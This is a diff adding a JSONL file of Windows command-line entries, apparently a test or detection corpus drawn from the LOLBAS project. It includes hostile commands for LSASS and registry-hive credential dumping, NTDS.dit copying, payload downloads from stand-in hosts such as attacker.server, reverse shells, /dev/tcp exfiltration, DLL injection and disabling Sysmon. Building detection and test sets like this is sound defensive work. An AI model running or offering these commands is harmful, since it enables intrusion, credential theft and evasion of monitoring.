@@ -1,0 +1,227 @@
+{"command": "rundll32.exe dfshim.dll,ShOpenVerbApplication http://www.domain.com/application/?param1=foo", "range": "full", "timeout": 5}
+{"command": "rundll32.exe pcwutl.dll,LaunchApplication calc.exe", "range": "full", "timeout": 5}
+{"command": "rundll32.exe url.dll,OpenURL \"C:\\test\\calc.hta\"", "range": "full", "timeout": 5}
+{"command": "rundll32.exe url.dll,OpenURL \"C:\\test\\calc.url\"", "range": "full", "timeout": 5}
+{"command": "rundll32.exe url.dll,OpenURL file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e", "range": "full", "timeout": 5}
+{"command": "rundll32.exe url.dll,FileProtocolHandler calc.exe", "range": "full", "timeout": 5}
+{"command": "rundll32.exe url.dll,FileProtocolHandler file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e", "range": "full", "timeout": 5}
+{"command": "rundll32.exe url.dll,FileProtocolHandler file:///C:/test/test.hta", "range": "full", "timeout": 5}
+{"command": "rundll32.exe zipfldr.dll,RouteTheCall calc.exe", "range": "full", "timeout": 5}
+{"command": "rundll32.exe zipfldr.dll,RouteTheCall file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e", "range": "full", "timeout": 5}
+{"command": "rundll32.exe ieadvpack.dll,LaunchINFSection c:\\test.inf,DefaultInstall_SingleUser,1,", "range": "full", "timeout": 5}
+{"command": "rundll32.exe ieadvpack.dll,LaunchINFSection c:\\test.inf,,1,", "range": "full", "timeout": 5}
+{"command": "rundll32.exe ieadvpack.dll,RegisterOCX test.dll", "range": "full", "timeout": 5}
+{"command": "rundll32.exe ieadvpack.dll,RegisterOCX calc.exe", "range": "full", "timeout": 5}
+{"command": "rundll32 ieadvpack.dll, RegisterOCX \"cmd.exe /c calc.exe\"", "range": "full", "timeout": 5}
+{"command": "rundll32.exe ieframe.dll,OpenURL \"C:\\test\\calc.url\"", "range": "full", "timeout": 5}
+{"command": "rundll32.exe advpack.dll,LaunchINFSection c:\\test.inf,DefaultInstall_SingleUser,1,", "range": "full", "timeout": 5}
+{"command": "rundll32.exe advpack.dll,LaunchINFSection c:\\test.inf,,1,", "range": "full", "timeout": 5}
+{"command": "rundll32.exe advpack.dll,RegisterOCX test.dll", "range": "full", "timeout": 5}
+{"command": "rundll32.exe advpack.dll,RegisterOCX calc.exe", "range": "full", "timeout": 5}
+{"command": "rundll32 advpack.dll, RegisterOCX \"cmd.exe /c calc.exe\"", "range": "full", "timeout": 5}
+{"command": "rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 c:\\test\\shady.inf", "range": "full", "timeout": 5}
+{"command": "rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 c:\\temp\\something.inf", "range": "full", "timeout": 5}
+{"command": "rundll32.exe shell32.dll,Control_RunDLL payload.dll", "range": "full", "timeout": 5}
+{"command": "rundll32.exe shell32.dll,ShellExec_RunDLL beacon.exe", "range": "full", "timeout": 5}
+{"command": "rundll32 SHELL32.DLL,ShellExec_RunDLL \"cmd.exe\" \"/c echo hi\"", "range": "full", "timeout": 5}
+{"command": "rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 C:\\Tools\\shady.inf", "range": "full", "timeout": 5}
+{"command": "rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 C:\\\\Tools\\\\calc_exe.inf", "range": "full", "timeout": 5}
+{"command": "rundll32.exe shdocvw.dll,OpenURL \"C:\\test\\calc.url\"", "range": "full", "timeout": 5}
+{"command": "rundll32.exe Mshtml.dll,PrintHTML \"C:\\temp\\calc.hta\"", "range": "full", "timeout": 5}
+{"command": "rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump \"[LSASS_PID] dump.bin full\"", "elevated": true, "range": "full", "timeout": 5}
+{"command": "regsvcs.exe AllTheThingsx64.dll", "elevated": true, "range": "full", "timeout": 5}
+{"command": "regsvcs.exe AllTheThingsx64.dll", "elevated": true, "range": "full", "timeout": 5}
+{"command": "OneDriveStandaloneUpdater", "range": "full", "timeout": 5}
+{"command": "echo !calc.exe > ftpcommands.txt && ftp -s:ftpcommands.txt", "range": "full", "timeout": 5}
+{"command": "cmd.exe /c \"@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v\"", "range": "full", "timeout": 5}
+{"command": "rundll32.exe dfshim.dll,ShOpenVerbApplication http://www.domain.com/application/?param1=foo", "range": "full", "timeout": 5}
+{"command": "OfflineScannerShell", "elevated": true, "range": "full", "timeout": 5}
+{"command": "rasautou -d powershell.dll -p powershell -a a -e e", "elevated": true, "range": "full", "timeout": 5}
+{"command": "schtasks /create /sc minute /mo 1 /tn \"Reverse shell\" /tr c:\\some\\directory\\revshell.exe", "range": "full", "timeout": 5}
+{"command": "schtasks /create /s targetmachine /tn \"MyTask\" /tr c:\\some\\directory\\notevil.exe /sc daily", "elevated": true, "range": "full", "timeout": 5}
+{"command": "CertReq -Post -config https://example.org/ c:\\windows\\win.ini output.txt", "range": "full", "timeout": 5}
+{"command": "CertReq -Post -config https://example.org/ c:\\windows\\win.ini and show response in terminal", "range": "full", "timeout": 5}
+{"command": "pktmon.exe start --etw", "elevated": true, "range": "full", "timeout": 5}
+{"command": "pktmon.exe filter add -p 445", "elevated": true, "range": "full", "timeout": 5}
+{"command": "xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC}", "range": "full", "timeout": 5}
+{"command": "xwizard RunWizard /taero /u {00000001-0000-0000-0000-0000FEEDACDC}", "range": "full", "timeout": 5}
+{"command": "xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /zhttps://pastebin.com/raw/iLxUT5gM", "range": "full", "timeout": 5}
+{"command": "findstr /V /L W3AllLov3LolBas c:\\ADS\\file.exe > c:\\ADS\\file.txt:file.exe", "range": "full", "timeout": 5}
+{"command": "findstr /V /L W3AllLov3LolBas \\\\webdavserver\\folder\\file.exe > c:\\ADS\\file.txt:file.exe", "range": "full", "timeout": 5}
+{"command": "findstr /S /I cpassword \\\\sysvol\\policies\\*.xml", "range": "full", "timeout": 5}
+{"command": "findstr /V /L W3AllLov3LolBas \\\\webdavserver\\folder\\file.exe > c:\\ADS\\file.exe", "range": "full", "timeout": 5}
+{"command": "esentutl.exe /y C:\\folder\\sourcefile.vbs /d C:\\folder\\destfile.vbs /o", "range": "full", "timeout": 5}
+{"command": "esentutl.exe /y C:\\ADS\\file.exe /d c:\\ADS\\file.txt:file.exe /o", "range": "full", "timeout": 5}
+{"command": "esentutl.exe /y C:\\ADS\\file.txt:file.exe /d c:\\ADS\\file.exe /o", "range": "full", "timeout": 5}
+{"command": "esentutl.exe /y \\\\192.168.100.100\\webdav\\file.exe /d c:\\ADS\\file.txt:file.exe /o", "range": "full", "timeout": 5}
+{"command": "esentutl.exe /y \\\\live.sysinternals.com\\tools\\adrestore.exe /d \\\\otherwebdavserver\\webdav\\adrestore.exe /o", "range": "full", "timeout": 5}
+{"command": "esentutl.exe /y /vss c:\\windows\\ntds\\ntds.dit /d c:\\folder\\ntds.dit", "elevated": true, "range": "full", "timeout": 5}
+{"command": "dllhost.exe /Processid:{CLSID}", "range": "full", "timeout": 5}
+{"command": "cscript c:\\ads\\file.txt:script.vbs", "range": "full", "timeout": 5}
+{"command": "reg export HKLM\\SOFTWARE\\Microsoft\\Evilreg c:\\ads\\file.txt:evilreg.reg", "range": "full", "timeout": 5}
+{"command": "reg save HKLM\\SECURITY c:\\test\\security.bak && reg save HKLM\\SYSTEM c:\\test\\system.bak && reg save HKLM\\SAM c:\\test\\sam.bak", "elevated": true, "range": "full", "timeout": 5}
+{"command": "C:\\Windows\\System32\\IME\\SHARED\\IMEWDBLD.exe https://pastebin.com/raw/tdyShwLw", "range": "full", "timeout": 5}
+{"command": "csc.exe -out:My.exe File.cs", "range": "full", "timeout": 5}
+{"command": "csc -target:library File.cs", "range": "full", "timeout": 5}
+{"command": "pnputil.exe -i -a C:\\Users\\hai\\Desktop\\mo.inf", "elevated": true, "range": "full", "timeout": 5}
+{"command": "ATBroker.exe /start malware", "range": "full", "timeout": 5}
+{"command": "DataSvcUtil /out:C:\\\\Windows\\\\System32\\\\calc.exe /uri:https://webhook.site/xxxxxxxxx?encodedfile", "range": "full", "timeout": 5}
+{"command": "start ms-appinstaller://?source=https://pastebin.com/raw/tdyShwLw", "range": "full", "timeout": 5}
+{"command": "print /D:C:\\ADS\\File.txt:file.exe C:\\ADS\\File.exe", "range": "full", "timeout": 5}
+{"command": "print /D:C:\\ADS\\CopyOfFile.exe C:\\ADS\\FileToCopy.exe", "range": "full", "timeout": 5}
+{"command": "print /D:C:\\OutFolder\\outfile.exe \\\\WebDavServer\\Folder\\File.exe", "range": "full", "timeout": 5}
+{"command": "Pcwrun.exe c:\\temp\\beacon.exe", "range": "full", "timeout": 5}
+{"command": "vbc.exe /target:exe c:\\temp\\vbs\\run.vb", "range": "full", "timeout": 5}
+{"command": "vbc -reference:Microsoft.VisualBasic.dll c:\\temp\\vbs\\run.vb", "range": "full", "timeout": 5}
+{"command": "diantz.exe c:\\pathToFile\\file.exe c:\\destinationFolder\\targetFile.txt:targetFile.cab", "range": "full", "timeout": 5}
+{"command": "diantz.exe \\\\remotemachine\\pathToFile\\file.exe c:\\destinationFolder\\file.cab", "range": "full", "timeout": 5}
+{"command": "rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM", "range": "full", "timeout": 5}
+{"command": "rpcping /s 10.0.0.35 /e 9997 /a connect /u NTLM", "range": "full", "timeout": 5}
+{"command": "wsreset.exe", "range": "full", "timeout": 5}
+{"command": "TTDInject.exe /ClientParams \"7 tmp.run 0 0 0 0 0 0 0 0 0 0\" /Launch \"C:/Windows/System32/calc.exe\"", "elevated": true, "range": "full", "timeout": 5}
+{"command": "ttdinject.exe /ClientScenario TTDRecorder /ddload 0 /ClientParams \"7 tmp.run 0 0 0 0 0 0 0 0 0 0\" /launch \"C:/Windows/System32/calc.exe\"", "elevated": true, "range": "full", "timeout": 5}
+{"command": "ilasm.exe C:\\public\\test.txt /exe", "range": "full", "timeout": 5}
+{"command": "ilasm.exe C:\\public\\test.txt /dll", "range": "full", "timeout": 5}
+{"command": "certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe", "range": "full", "timeout": 5}
+{"command": "certutil.exe -verifyctl -f -split http://7-zip.org/a/7z1604-x64.exe 7zip.exe", "range": "full", "timeout": 5}
+{"command": "certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\\temp:ttt", "range": "full", "timeout": 5}
+{"command": "certutil -encode inputFileName encodedOutputFileName", "range": "full", "timeout": 5}
+{"command": "certutil -decode encodedInputFileName decodedOutputFileName", "range": "full", "timeout": 5}
+{"command": "certutil --decodehex encoded_hexadecimal_InputFileName", "range": "full", "timeout": 5}
+{"command": "replace.exe C:\\Source\\File.cab C:\\Destination /A", "range": "full", "timeout": 5}
+{"command": "replace.exe \\\\webdav.host.com\\foo\\bar.exe c:\\outdir /A", "range": "full", "timeout": 5}
+{"command": "mshta.exe evilfile.hta", "range": "full", "timeout": 5}
+{"command": "mshta.exe vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))", "range": "full", "timeout": 5}
+{"command": "mshta.exe javascript:a=GetObject(\"script:https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/Mshta_calc.sct\").Exec();close();", "range": "full", "timeout": 5}
+{"command": "mshta.exe \"C:\\ads\\file.txt:file.hta\"", "range": "full", "timeout": 5}
+{"command": "bitsadmin /create 1 bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1", "range": "full", "timeout": 5}
+{"command": "bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\\data\\playfolder\\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1", "range": "full", "timeout": 5}
+{"command": "bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset", "range": "full", "timeout": 5}
+{"command": "bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset", "range": "full", "timeout": 5}
+{"command": "wscript c:\\ads\\file.txt:script.vbs", "range": "full", "timeout": 5}
+{"command": "echo GetObject(\"script:https://raw.githubusercontent.com/sailay1996/misc-bin/master/calc.js\") > %temp%\\test.txt:hi.js && wscript.exe %temp%\\test.txt:hi.js", "range": "full", "timeout": 5}
+{"command": "certoc.exe -LoadDLL \"C:\\test\\calc.dll\"", "range": "full", "timeout": 5}
+{"command": "certoc.exe -GetCACAPS https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1", "range": "full", "timeout": 5}
+{"command": "ieexec.exe http://x.x.x.x:8080/bypass.exe", "range": "full", "timeout": 5}
+{"command": "ieexec.exe http://x.x.x.x:8080/bypass.exe", "range": "full", "timeout": 5}
+{"command": "cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct ^scrobj.dll > fakefile.doc:payload.bat", "range": "full", "timeout": 5}
+{"command": "cmd.exe - < fakefile.doc:payload.bat", "range": "full", "timeout": 5}
+{"command": "Microsoft.Workflow.Compiler.exe tests.xml results.xml", "range": "full", "timeout": 5}
+{"command": "Microsoft.Workflow.Compiler.exe tests.txt results.txt", "range": "full", "timeout": 5}
+{"command": "Microsoft.Workflow.Compiler.exe tests.txt results.txt", "range": "full", "timeout": 5}
+{"command": "cmdl32 /vpn /lan %cd%\\config", "range": "full", "timeout": 5}
+{"command": "runscripthelper.exe surfacecheck \\\\?\\C:\\Test\\Microsoft\\Diagnosis\\scripts\\test.txt C:\\Test", "range": "full", "timeout": 5}
+{"command": "PrintBrm -b -d \\\\1.2.3.4\\share\\example_folder -f C:\\Users\\user\\Desktop\\new.zip", "range": "full", "timeout": 5}
+{"command": "PrintBrm -r -f C:\\Users\\user\\Desktop\\data.txt:hidden.zip -d C:\\Users\\user\\Desktop\\new_folder", "range": "full", "timeout": 5}
+{"command": "makecab c:\\ADS\\autoruns.exe c:\\ADS\\cabtest.txt:autoruns.cab", "range": "full", "timeout": 5}
+{"command": "makecab \\\\webdavserver\\webdav\\file.exe C:\\Folder\\file.txt:file.cab", "range": "full", "timeout": 5}
+{"command": "makecab \\\\webdavserver\\webdav\\file.exe C:\\Folder\\file.cab", "range": "full", "timeout": 5}
+{"command": "forfiles /p c:\\windows\\system32 /m notepad.exe /c calc.exe", "range": "full", "timeout": 5}
+{"command": "forfiles /p c:\\windows\\system32 /m notepad.exe /c \"c:\\folder\\normal.dll:evil.exe\"", "range": "full", "timeout": 5}
+{"command": "set \"SYSTEMROOT=C:\\Windows\\Temp\" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://domain.com:8080/file.ext /eventName:desktopimgdownldr", "range": "full", "timeout": 5}
+{"command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\aspnet_compiler.exe -v none -p C:\\users\\cpl.internal\\desktop\\asptest\\ -f C:\\users\\cpl.internal\\desktop\\asptest\\none -u", "range": "full", "timeout": 5}
+{"command": "control.exe c:\\windows\\tasks\\file.txt:evil.dll", "range": "full", "timeout": 5}
+{"command": "msbuild.exe pshell.xml", "range": "full", "timeout": 5}
+{"command": "msbuild.exe project.csproj", "range": "full", "timeout": 5}
+{"command": "msbuild.exe @sample.rsp", "range": "full", "timeout": 5}
+{"command": "msbuild.exe /logger:TargetLogger,C:\\Loggers\\TargetLogger.dll;MyParameters,Foo", "range": "full", "timeout": 5}
+{"command": "msbuild.exe project.proj", "range": "full", "timeout": 5}
+{"command": "Register-cimprovider -path \"C:\\folder\\evil.dll\"", "range": "full", "timeout": 5}
+{"command": "fltMC.exe unload SysmonDrv", "elevated": true, "range": "full", "timeout": 5}
+{"command": "tttracer.exe C:\\windows\\system32\\calc.exe", "elevated": true, "range": "full", "timeout": 5}
+{"command": "TTTracer.exe -dumpFull -attach pid", "elevated": true, "range": "full", "timeout": 5}
+{"command": "ie4uinit.exe -BaseSettings", "range": "full", "timeout": 5}
+{"command": "sc create evilservice binPath=\"\\\"c:\\\\ADS\\\\file.txt:cmd.exe\\\" /c echo works > \\\"c:\\ADS\\works.txt\\\"\" DisplayName= \"evilservice\" start= auto\\ & sc start evilservice", "range": "full", "timeout": 5}
+{"command": "sc config <existing> binPath=\"\\\"c:\\\\ADS\\\\file.txt:cmd.exe\\\" /c echo works > \\\"c:\\ADS\\works.txt\\\"\" & sc start <existing>", "range": "full", "timeout": 5}
+{"command": "bash.exe -c calc.exe", "range": "full", "timeout": 5}
+{"command": "bash.exe -c \"socat tcp-connect:192.168.1.9:66 exec:sh,pty,stderr,setsid,sigint,sane\"", "range": "full", "timeout": 5}
+{"command": "bash.exe -c 'cat file_to_exfil.zip > /dev/tcp/192.168.1.10/24'", "range": "full", "timeout": 5}
+{"command": "bash.exe -c calc.exe", "range": "full", "timeout": 5}
+{"command": "HH.exe http://some.url/script.ps1", "range": "full", "timeout": 5}
+{"command": "HH.exe c:\\windows\\system32\\calc.exe", "range": "full", "timeout": 5}
+{"command": "SettingSyncHost -LoadAndRunDiagScript anything", "range": "full", "timeout": 5}
+{"command": "SettingSyncHost -LoadAndRunDiagScriptNoCab anything", "range": "full", "timeout": 5}
+{"command": "finger user@example.host.com | more +2 | cmd", "range": "full", "timeout": 5}
+{"command": "cmstp.exe /ni /s c:\\cmstp\\CorpVPN.inf", "range": "full", "timeout": 5}
+{"command": "cmstp.exe /ni /s https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf", "range": "full", "timeout": 5}
+{"command": "mmc.exe -Embedding c:\\path\\to\\test.msc", "range": "full", "timeout": 5}
+{"command": "mmc.exe gpedit.msc", "elevated": true, "range": "full", "timeout": 5}
+{"command": "jsc.exe scriptfile.js", "range": "full", "timeout": 5}
+{"command": "jsc.exe /t:library Library.js", "range": "full", "timeout": 5}
+{"command": "ConfigSecurityPolicy.exe C:\\\\Windows\\\\System32\\\\calc.exe https://webhook.site/xxxxxxxxx?encodedfile", "range": "full", "timeout": 5}
+{"command": "stordiag.exe", "range": "full", "timeout": 5}
+{"command": "Scriptrunner.exe -appvscript calc.exe", "range": "full", "timeout": 5}
+{"command": "ScriptRunner.exe -appvscript \"\\\\fileserver\\calc.cmd\"", "range": "full", "timeout": 5}
+{"command": "odbcconf -f file.rsp", "range": "full", "timeout": 5}
+{"command": "odbcconf /a {REGSVR c:\\test\\test.dll}", "range": "full", "timeout": 5}
+{"command": "Extexport.exe c:\\test foo bar", "range": "full", "timeout": 5}
+{"command": "msdt.exe -path C:\\WINDOWS\\diagnostics\\index\\PCWDiagnostic.xml -af C:\\PCW8E57.xml /skip TRUE", "range": "full", "timeout": 5}
+{"command": "msdt.exe -path C:\\WINDOWS\\diagnostics\\index\\PCWDiagnostic.xml -af C:\\PCW8E57.xml /skip TRUE", "range": "full", "timeout": 5}
+{"command": "WorkFolders", "range": "full", "timeout": 5}
+{"command": "diskshadow.exe /s c:\\test\\diskshadow.txt", "range": "full", "timeout": 5}
+{"command": "diskshadow> exec calc.exe", "range": "full", "timeout": 5}
+{"command": "extrac32 C:\\ADS\\procexp.cab c:\\ADS\\file.txt:procexp.exe", "range": "full", "timeout": 5}
+{"command": "extrac32 \\\\webdavserver\\webdav\\file.cab c:\\ADS\\file.txt:file.exe", "range": "full", "timeout": 5}
+{"command": "extrac32 /Y /C \\\\webdavserver\\share\\test.txt C:\\folder\\test.txt", "range": "full", "timeout": 5}
+{"command": "extrac32.exe /C C:\\Windows\\System32\\calc.exe C:\\Users\\user\\Desktop\\calc.exe", "range": "full", "timeout": 5}
+{"command": "eventvwr.exe", "range": "full", "timeout": 5}
+{"command": "MavInject.exe 3110 /INJECTRUNNING c:\\folder\\evil.dll", "range": "full", "timeout": 5}
+{"command": "Mavinject.exe 4172 /INJECTRUNNING \"c:\\ads\\file.txt:file.dll\"", "range": "full", "timeout": 5}
+{"command": "regasm.exe AllTheThingsx64.dll", "elevated": true, "range": "full", "timeout": 5}
+{"command": "regasm.exe /U AllTheThingsx64.dll", "range": "full", "timeout": 5}
+{"command": "Gpscript /logon", "elevated": true, "range": "full", "timeout": 5}
+{"command": "Gpscript /startup", "elevated": true, "range": "full", "timeout": 5}
+{"command": "rundll32.exe AllTheThingsx64,EntryPoint", "range": "full", "timeout": 5}
+{"command": "rundll32.exe \\\\10.10.10.10\\share\\payload.dll,EntryPoint", "range": "full", "timeout": 5}
+{"command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"WScript.Shell\").Run(\"powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');\"", "range": "full", "timeout": 5}
+{"command": "rundll32.exe javascript:\"\\..\\mshtml.dll,RunHTMLApplication \";eval(\"w=new%20ActiveXObject(\\\"WScript.Shell\\\");w.run(\\\"calc\\\");window.close()\");", "range": "full", "timeout": 5}
+{"command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WScript.Shell\").run(\"calc.exe\",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c taskkill /f /im rundll32.exe\",0,true);}", "range": "full", "timeout": 5}
+{"command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test\")", "range": "full", "timeout": 5}
+{"command": "rundll32 \"C:\\ads\\file.txt:ADSDLL.dll\",DllMain", "range": "full", "timeout": 5}
+{"command": "rundll32.exe -sta {CLSID}", "range": "full", "timeout": 5}
+{"command": "regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll", "range": "full", "timeout": 5}
+{"command": "regsvr32.exe /s /u /i:file.sct scrobj.dll", "range": "full", "timeout": 5}
+{"command": "regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll", "range": "full", "timeout": 5}
+{"command": "regsvr32.exe /s /u /i:file.sct scrobj.dll", "range": "full", "timeout": 5}
+{"command": "regedit /E c:\\ads\\file.txt:regfile.reg HKEY_CURRENT_USER\\MyCustomRegKey", "range": "full", "timeout": 5}
+{"command": "regedit C:\\ads\\file.txt:regfile.reg", "range": "full", "timeout": 5}
+{"command": "msiexec /quiet /i cmd.msi", "range": "full", "timeout": 5}
+{"command": "msiexec /q /i http://192.168.100.3/tmp/cmd.png", "range": "full", "timeout": 5}
+{"command": "msiexec /y \"C:\\folder\\evil.dll\"", "range": "full", "timeout": 5}
+{"command": "msiexec /z \"C:\\folder\\evil.dll\"", "range": "full", "timeout": 5}
+{"command": "C:\\Windows\\System32\\DriverStore\\FileRepository\\igdlh64.inf_amd64_[0-9]+\\GfxDownloadWrapper.exe \"URL\" \"DESTINATION FILE\"", "range": "full", "timeout": 5}
+{"command": "wuauclt.exe /UpdateDeploymentProvider Full_Path_To_DLL /RunHandlerComServer", "range": "full", "timeout": 5}
+{"command": "Presentationhost.exe C:\\temp\\Evil.xbap", "range": "full", "timeout": 5}
+{"command": "regini.exe newfile.txt:hidden.ini", "range": "full", "timeout": 5}
+{"command": "MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\\\\temp\\\\beacon.exe", "range": "full", "timeout": 5}
+{"command": "copy \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\MpCmdRun.exe\" C:\\Users\\Public\\Downloads\\MP.exe && chdir \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\\" && \"C:\\Users\\Public\\Downloads\\MP.exe\" -DownloadFile -url https://attacker.server/beacon.exe -path C:\\Users\\Public\\Downloads\\evil.exe", "range": "full", "timeout": 5}
+{"command": "MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\\\\temp\\\\nicefile.txt:evil.exe", "range": "full", "timeout": 5}
+{"command": "wmic.exe process call create \"c:\\ads\\file.txt:program.exe\"", "range": "full", "timeout": 5}
+{"command": "wmic.exe process call create calc", "range": "full", "timeout": 5}
+{"command": "wmic.exe process call create \"C:\\Windows\\system32\\reg.exe add \\\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\osk.exe\\\" /v \\\"Debugger\\\" /t REG_SZ /d \\\"cmd.exe\\\" /f\"", "range": "full", "timeout": 5}
+{"command": "wmic.exe /node:\"192.168.0.1\" process call create \"evil.exe\"", "range": "full", "timeout": 5}
+{"command": "wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create \"at 9:00PM c:\\GoogleUpdate.exe ^> c:\\notGoogleUpdateResults.txt\"", "range": "full", "timeout": 5}
+{"command": "wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create \"cmd /c vssadmin create shadow /for=C:\\Windows\\NTDS\\NTDS.dit > c:\\not_the_NTDS.dit\"", "range": "full", "timeout": 5}
+{"command": "wmic.exe process get brief /format:\"https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/Wmic_calc.xsl\"", "range": "full", "timeout": 5}
+{"command": "wmic.exe process get brief /format:\"\\\\127.0.0.1\\c$\\Tools\\pocremote.xsl\"", "range": "full", "timeout": 5}
+{"command": "Runonce.exe /AlternateShellStartup", "elevated": true, "range": "full", "timeout": 5}
+{"command": "SyncAppvPublishingServer.exe \"n;(New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX\"", "range": "full", "timeout": 5}
+{"command": "verclsid.exe /S /C {CLSID}", "range": "full", "timeout": 5}
+{"command": "psr.exe /start /output D:\\test.zip /sc 1 /gui 0", "range": "full", "timeout": 5}
+{"command": "InfDefaultInstall.exe Infdefaultinstall.inf", "range": "full", "timeout": 5}
+{"command": "explorer.exe /root,\"C:\\Windows\\System32\\calc.exe\"", "range": "full", "timeout": 5}
+{"command": "explorer.exe C:\\Windows\\System32\\notepad.exe", "range": "full", "timeout": 5}
+{"command": "expand \\\\webdav\\folder\\file.bat c:\\ADS\\file.bat", "range": "full", "timeout": 5}
+{"command": "expand c:\\ADS\\file1.bat c:\\ADS\\file2.bat", "range": "full", "timeout": 5}
+{"command": "expand \\\\webdav\\folder\\file.bat c:\\ADS\\file.txt:file.bat", "range": "full", "timeout": 5}
+{"command": "InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll", "range": "full", "timeout": 5}
+{"command": "InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll", "range": "full", "timeout": 5}
+{"command": "netsh.exe add helper C:\\Users\\User\\file.dll", "range": "full", "timeout": 5}
+{"command": "wab.exe", "elevated": true, "range": "full", "timeout": 5}
+{"command": "dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\\\192.168.0.149\\dll\\wtf.dll", "elevated": true, "range": "full", "timeout": 5}
+{"command": "C:\\Windows\\System32\\at.exe at 09:00 /interactive /every:m,t,w,th,f,s,su C:\\Windows\\System32\\revshell.exe", "elevated": true, "range": "full", "timeout": 5}
+{"command": "pcalua.exe -a calc.exe", "range": "full", "timeout": 5}
+{"command": "pcalua.exe -a \\\\server\\payload.dll", "range": "full", "timeout": 5}
+{"command": "pcalua.exe -a C:\\Windows\\system32\\javacpl.cpl -c Java", "range": "full", "timeout": 5}
+{"command": "cmdkey /list", "range": "full", "timeout": 5}
+{"command": "Msconfig.exe -5", "elevated": true, "range": "full", "timeout": 5}
